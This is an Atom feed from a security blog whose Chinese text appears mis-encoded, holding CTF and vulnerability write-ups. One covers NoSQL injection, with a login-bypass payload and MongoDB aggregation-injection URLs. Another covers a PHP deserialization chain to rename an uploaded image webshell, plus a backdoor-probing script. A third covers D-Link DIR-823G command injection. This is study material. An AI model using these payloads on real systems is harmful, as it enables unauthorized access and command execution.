<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://prontosil.club/"/>
  <updated>2019-08-04T08:53:19.643Z</updated>
  <id>https://prontosil.club/</id>
  
  <author>
    <name>ç™¾æµªå¤šæ¯</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>noSQL Injection</title>
    <link href="https://prontosil.club/2019/08/04/noSQL-Injection/"/>
    <id>https://prontosil.club/2019/08/04/noSQL-Injection/</id>
    <published>2019-08-04T08:23:29.000Z</published>
    <updated>2019-08-04T08:53:19.643Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é“é¢˜æ˜¯cybricsçš„ä¸€é“webé¢˜ï¼Œç”±äºæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦noSQLæ³¨å…¥ï¼Œæ‰€ä»¥å•ç‹¬æ‹¿å‡ºæ¥å¥½å¥½ç ”ç©¶ä¸€ä¸‹</p><p>phpæ“ä½œmongodbçš„è¯­æ³•ï¼š</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// connect to mongodb</span></span><br><span class="line">$m = <span class="keyword">new</span> MongoClient();</span><br><span class="line"><span class="comment">// select a database</span></span><br><span class="line">$db = $m-&gt;test;</span><br><span class="line"><span class="comment">// select collection</span></span><br><span class="line">$collection = $db-&gt;users;</span><br><span class="line"></span><br><span class="line">$cursor = $collection-&gt;find($data);</span><br><span class="line">$cursor = $collection-&gt;findone($data);</span><br></pre></td></tr></table></figure></p><p>åŸºæœ¬ä¸Šå°±æ˜¯å®ä¾‹åŒ–å¯¹è±¡ï¼Œé€‰æ‹©æ•°æ®åº“ï¼Œé€‰æ‹©è¡¨ï¼Œç„¶åå¼€å§‹æŸ¥æ‰¾</p><p>æŸ¥è¯¢è¯­æ³•ä¸»è¦å¦‚ä¸‹ï¼š</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.user.find(&#123;<span class="string">'username'</span>: <span class="string">'xxxppp'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//æŸ¥æ‰¾ç”¨æˆ·åä¸ä¸ºadminä¸”passwordä¸º123456çš„ç”¨æˆ·</span></span><br><span class="line">db.user.find(&#123;<span class="string">'username'</span>:&#123;$ne:<span class="string">'admin'</span>&#125;, <span class="string">'password'</span>:<span class="string">'123456'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ­£åˆ™åŒ¹é…ï¼š</span></span><br><span class="line"></span><br><span class="line">db.customer.find(&#123;<span class="string">'name'</span>: &#123;<span class="string">'$regex'</span>:<span class="string">'.*s.*'</span>&#125; &#125;)</span><br><span class="line">db.user.find(&#123;<span class="string">'username'</span>:/jrx/i&#125;)</span><br></pre></td></tr></table></figure></p><p>è¿™é“é¢˜ç›®é¦–å…ˆå¯ä»¥ç”¨<code>dirsearch</code>å‘ç°æ˜¯gitæºç æ³„éœ²ï¼Œä¹‹åç”¨<code>GitHacker.py</code>è·å–åˆ°æºç </p><p>æŸ¥çœ‹<code>index.php</code>ï¼Œé¦–å…ˆè¦ç™»é™†ï¼Œéœ€è¦ç»•è¿‡<code>auth</code>å‡½æ•°</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>username</code>å’Œ<code>password</code>éƒ½æ²¡æœ‰ç»è¿‡è¿‡æ»¤å°±æ‹¼æ¥äº†ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ª<code>json_decode</code>ä¸å¤ªå¥½è¿‡</p><p>å¦‚æœæ²¡æœ‰<code>json_decode</code>å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:&quot;1&quot;}}</code>ç»•è¿‡ç™»é™†çš„é™åˆ¶</p><p>äºæ˜¯è¿™æ ·åšï¼š</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql0.png" alt=""></p><p>è¿™æ ·å°±ç»•è¿‡é™åˆ¶ç™»é™†äº†</p><p>æ¥çœ‹ç¬¬äºŒä¸ªï¼š</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">    $pipeline = [</span><br><span class="line">        [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">        [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">        [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $filters = [</span><br><span class="line">        [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><code>array_merge</code>å‡½æ•°å°†<code>$pipeline</code>å’Œ<code>filters</code>è¿›è¡Œåˆå¹¶</p><p>æŸ¥æ‰¾èµ„æ–™å¾—çŸ¥</p><blockquote><p>åœ¨mongodbçš„aggregateä¸­ï¼Œå¯ä»¥ä½¿ç”¨$condè¿›è¡Œæ¡ä»¶è¯­å¥ï¼š</p></blockquote><p>å¹¶ä¸”ï¼š</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/noSql1.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹é“¾æ¥ï¼ŒåŒ¹é…åˆ°<code>flag</code>æ—¶å°†å…¶ç§»é™¤</p><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$$REMOVE&amp;filter[$cond][else]=$category</code></p><blockquote><p>åˆ©ç”¨æ¡ä»¶è¯­å¥ï¼Œå‘ç°flagsæ—¶ï¼Œå°±è¾“å‡ºå…¶titleï¼š</p></blockquote><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category</code></p><p>ä»titleä¸­æˆ‘ä»¬å¾—çŸ¥æœ‰textï¼Œé‚£ä¹ˆè¯»å–ï¼š</p><p><code>http://173.199.118.226/index.php?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category</code></p><p>å°±å¯ä»¥è·å¾—flagäº†</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/nosql2.png" alt=""></p><h2>å‚è€ƒ</h2><p><a href="https://blog.szfszf.top/tech/nosql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93mongodb/#MongoDB" target="_blank" rel="noopener">NoSQLæ³¨å…¥æ€»ç»“(MongoDB)</a></p><p><a href="https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/" target="_blank" rel="noopener">019 CyBRICS CTF Quals wp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;è¿™é“é¢˜æ˜¯cybricsçš„ä¸€é“webé¢˜ï¼Œç”±äºæ˜¯ç¬¬ä¸€æ¬¡æ¥è§¦noSQLæ³¨å…¥ï¼Œæ‰€ä»¥å•ç‹¬æ‹¿å‡ºæ¥å¥½å¥½ç ”ç©¶ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;phpæ“ä½œmongodbçš„è¯­æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="cybrics" scheme="https://prontosil.club/tags/cybrics/"/>
    
      <category term="NoSQL" scheme="https://prontosil.club/tags/NoSQL/"/>
    
  </entry>
  
  <entry>
    <title>qwbå¤ç°</title>
    <link href="https://prontosil.club/2019/08/03/qwb%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/08/03/qwbå¤ç°/</id>
    <published>2019-08-03T14:23:50.000Z</published>
    <updated>2019-08-04T06:01:55.712Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ç°ä¸€äº›qwbçš„é¢˜ç›®</p><h2>upload</h2><p>å¯ä»¥é€šè¿‡dirsearchæ‰¾åˆ°æ³„éœ²çš„æºç  ï¼Œ -uæŒ‡å®šurlï¼Œ -eæŒ‡å®šæ’ä»¶å¦‚æœæ˜¯ä»£ç å®¡è®¡é¢˜ï¼Œè€Œä¸”æ˜¯æ–‡ä»¶å¾ˆå¤šçš„ï¼Œéœ€è¦æ‰¾åˆ°åˆ©ç”¨ç‚¹ï¼Œæˆ‘ä»¬ç›´æ¥æœç´¢<code>unserialize</code>æ‰¾åˆ°ä¸€å¤„å¯ä»¥åˆ©ç”¨çš„ä»£ç ï¼š</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">       $profile=cookie(<span class="string">'user'</span>);  <span class="comment">//è·å–åˆ°cookieä¸­çš„userå€¼</span></span><br><span class="line">       <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile)); <span class="comment">//ç›´æ¥ååºåˆ—åŒ–</span></span><br><span class="line">           <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">           <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>æ¥ä¸‹æ¥å»å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œåœ¨Profileè¿™ä¸ªç±»ä¸­<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">         <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">             $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">             <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">             <span class="keyword">exit</span>();</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     ...</span><br></pre></td></tr></table></figure></p><p><code>upload_imgæ–¹æ³•</code>ä¼šè°ƒç”¨<code>login_check</code>ååºåˆ—åŒ–</p><blockquote><p>è€Œè¿™ä¸ªæ“ä½œä¸­çš„ $this-&gt;extã€$this-&gt;filename_tmpã€$this-&gt;filename å‡å¯é€šè¿‡ååºåˆ—åŒ–æ§åˆ¶ã€‚</p></blockquote><p>åŒæ—¶åœ¨<code>Profile.php</code>æ–‡ä»¶çš„æœ«å°¾è¿˜æœ‰ä¸€å¤„</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸¤ä¸ªå‡½æ•°çš„æ„æ€æ˜¯å¦‚æœè®¿é—®äº†ç±»ä¸­çš„<code>private</code>å±æ€§ï¼Œå°±ä¼šè°ƒç”¨<code>__get</code>æ–¹æ³•ï¼Œå¦‚æœè°ƒç”¨äº†ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±ä¼šé€šè¿‡<code>__call</code>å¯¹<code>$this-&gt;name</code>æ‰€æŒ‡å‘çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨</p><p>æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•</p><p>åŒæ—¶åœ¨<code>Register.php</code>ä¸­æœ‰ä¸€å¤„ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œä¹‹åé€šè¿‡<code>Register</code>ç±»çš„<code>__destruct</code>æ–¹æ³•ï¼Œè°ƒç”¨<code>__get</code>æ–¹æ³•å¾—åˆ°å‡½æ•°å<code>upload_img</code>ï¼Œå†è°ƒç”¨<code>__call</code>æ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨<code>upload_img</code>å¯ä»¥å¯¹å›¾ç‰‡é©¬è¿›è¡Œæ”¹å</p><p>å¦‚æœæˆ‘ä»¬å°†<code>$this-&gt;checker</code>èµ‹å€¼ä¸º<code>Profile</code>ç±»ï¼Œç”±äº<code>Profile</code>ç±»ä¸­ä¸å­˜åœ¨<code>index</code>æ–¹æ³•ï¼Œå°±ä¼šè§¦å‘<code>__call</code>ï¼Œè¿™æ ·å°±èƒ½æ„é€ ä¸€æ¡å®Œæˆçš„æ”»å‡»é“¾</p><h2>é«˜æ˜çš„é»‘å®¢</h2><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">filenames = os.listdir(<span class="string">'/var/www/html/src'</span>)</span><br><span class="line">pattern = re.compile(<span class="string">r"\$_[GEPOST]&#123;3,4&#125;\[.*\]"</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> filenames:</span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/var/www/html/src/'</span>+name,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    result = list(set(pattern.findall(data)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ret <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            command = <span class="string">'uname'</span></span><br><span class="line">            flag = <span class="string">'Linux'</span></span><br><span class="line">            <span class="comment"># command = 'phpinfo();'</span></span><br><span class="line">            <span class="comment"># flag = 'phpinfo'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'GET'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.get(url=<span class="string">'http://127.0.0.1:8888/'</span> + name + <span class="string">'?'</span> + passwd + <span class="string">'='</span>+ command)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'GET:  '</span> + passwd)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'POST'</span> <span class="keyword">in</span> ret:</span><br><span class="line">                passwd = re.findall(<span class="string">r"'(.*)'"</span>,ret)[<span class="number">0</span>]</span><br><span class="line">                r = requests.post(url=<span class="string">'http://127.0.0.1:8888/'</span> + name,data=&#123;passwd:command&#125;)</span><br><span class="line">                <span class="keyword">if</span> flag <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">'backdoor file is: '</span> + name)</span><br><span class="line">                    print(<span class="string">'POST:  '</span> + passwd)</span><br><span class="line">        <span class="keyword">except</span> : <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å¤ç°ä¸€äº›qwbçš„é¢˜ç›®&lt;/p&gt;
&lt;h2&gt;upload&lt;/h2&gt;
&lt;p&gt;å¯ä»¥é€šè¿‡dirsearchæ‰¾åˆ°æ³„éœ²çš„æºç  ï¼Œ -uæŒ‡å®šurlï¼Œ -eæŒ‡å®šæ’ä»¶
å¦‚æœæ˜¯ä»£ç å®¡è®¡é¢˜ï¼Œè€Œä¸”æ˜¯æ–‡ä»¶å¾ˆå¤šçš„ï¼Œéœ€è¦æ‰¾åˆ°åˆ©ç”¨ç‚¹ï¼Œæˆ‘ä»¬ç›´æ¥æœç´¢&lt;code&gt;unserialize&lt;/code&gt;æ‰¾åˆ°ä¸€å¤„å¯ä»¥åˆ©ç”¨
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="web" scheme="https://prontosil.club/tags/web/"/>
    
      <category term="thinkphp" scheme="https://prontosil.club/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>DIR-823Gå¤ç°</title>
    <link href="https://prontosil.club/2019/08/03/DIR-823G%E5%A4%8D%E7%8E%B0/"/>
    <id>https://prontosil.club/2019/08/03/DIR-823Gå¤ç°/</id>
    <published>2019-08-03T10:05:40.000Z</published>
    <updated>2019-08-03T10:07:13.522Z</updated>
    
    <content type="html"><![CDATA[<h2>Dlink DIR-823Gæ¼æ´å¤ç°(CVE-2019-7298, CVE-2019-7297)</h2><p>binwaleæå–æ–‡ä»¶</p><p>æ–‡ä»¶ä¸‹è½½<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823GA1_FW102B03.bin" target="_blank" rel="noopener">åœ°å€</a></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823.png" alt=""></p><p>ä¹‹åè¿›è¡Œå›ºä»¶çš„æ¨¡æ‹Ÿï¼Œ</p><p>æˆåŠŸpingé€šç½‘ç»œ<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ping0.png" alt=""></p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-4.png" alt=""></p><p>ç¬¬ä¸€æ¬¡è¿›å…¥è·¯ç”±å™¨éœ€è¦éœ€è¦è¿›è¡Œä¸€äº›è®¾ç½®é¡µé¢ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æœªæˆæƒè®¿é—®çš„æƒ…å†µ</p><p>å¯¼å‡ºé…ç½®æ–‡ä»¶ï¼ˆä¿¡æ¯æ³„éœ²ï¼‰ã€‚</p><p><img src="https://i.imgur.com/2ElxWaU.png" alt="DIR823-0"></p><p>&lt;!-- <img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-0.png" alt=""> --&gt;</p><p>æµè§ˆå™¨è®¿é—®ç›´æ¥å¼¹å‡ºäº†ä¸‹è½½é¡µé¢</p><p><img src="https://i.imgur.com/7Y9pWFQ.png" alt="DIR823-1"></p><p>å¯¼å‡ºé…ç½®æ–‡ä»¶ï¼Œ<img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-2.png" alt=""></p><p>è·å–åˆ°ç³»ç»Ÿä¿¡æ¯</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-3.png" alt=""></p><h2>goaheadç¨‹åºåˆ†æ(å‘½ä»¤æ³¨å…¥)</h2><p>åœ¨æŸ¥çœ‹å›ºä»¶çš„binç›®å½•æ—¶å‘ç°äº†ä¸€ä¸ªgoaheadçš„ç¨‹åºï¼Œè¯´æ˜æ­¤è·¯ç”±å™¨æ˜¯é€šè¿‡goaheadè¿›è¡Œå¼€å‘çš„</p><p>æ‹–å…¥åˆ°IDAä¸­è¿›è¡Œåˆ†æï¼Œå‘ç°0x42424Cå¤„æ³¨å†Œäº†å¤„ç†å‡½æ•°</p><p>æŠ“å–åˆ°ç™»é™†çš„æ•°æ®åŒ…ï¼Œæ˜¯å‘å¾€/HNAP1/çš„</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-5.png" alt=""></p><p>åˆ†æ<code>/HNAP1</code> å¤„ç†å‡½æ•°çš„é€»è¾‘ã€‚ å‡½æ•°ä½äº<code>0x42383C</code></p><p>åœ¨è¿™ä¸ªéƒ¨åˆ†ï¼Œä»å‡½æ•°è¡¨ä¸­è¿›è¡Œéå†ï¼Œå¯»æ‰¾å‡½æ•°</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-6.png" alt=""></p><p>å‡½æ•°è¡¨å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-7.png" alt=""></p><p>æ‰¾åˆ°äº†éœ€è¦è°ƒç”¨çš„å¤„ç†å‡½æ•°åï¼Œä¼šé¦–å…ˆè®°å½• POST çš„åŸå§‹æŠ¥æ–‡, é¦–å…ˆç”¨ snprintf ç”Ÿæˆå‘½ä»¤ï¼Œ ç„¶åä½¿ç”¨ system æ‰§è¡Œã€‚</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-8.png" alt=""></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥æ³¨å…¥ <code>'</code> æ¥å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-9.png" alt=""></p><p>éªŒè¯ä¸€ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/DIR823-10.png" alt=""></p><h2>å‚è€ƒ</h2><p><a href="https://github.com/leonW7/D-Link/blob/master/Vul_2.md" target="_blank" rel="noopener">DIR-823G HNAP_Entry_Func</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;Dlink DIR-823Gæ¼æ´å¤ç°(CVE-2019-7298, CVE-2019-7297)&lt;/h2&gt;
&lt;p&gt;binwaleæå–æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶ä¸‹è½½&lt;a href=&quot;https://raw.githubusercontent.com/xinyongpeng/g
      
    
    </summary>
    
      <category term="IOT" scheme="https://prontosil.club/categories/IOT/"/>
    
    
      <category term="CVE" scheme="https://prontosil.club/tags/CVE/"/>
    
      <category term="goahead" scheme="https://prontosil.club/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>pythonæ–‡æ¡£é˜…è¯»ç¬”è®°3</title>
    <link href="https://prontosil.club/2019/07/31/python%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B03/"/>
    <id>https://prontosil.club/2019/07/31/pythonæ–‡æ¡£é˜…è¯»ç¬”è®°3/</id>
    <published>2019-07-31T14:16:03.000Z</published>
    <updated>2019-08-01T01:18:42.222Z</updated>
    
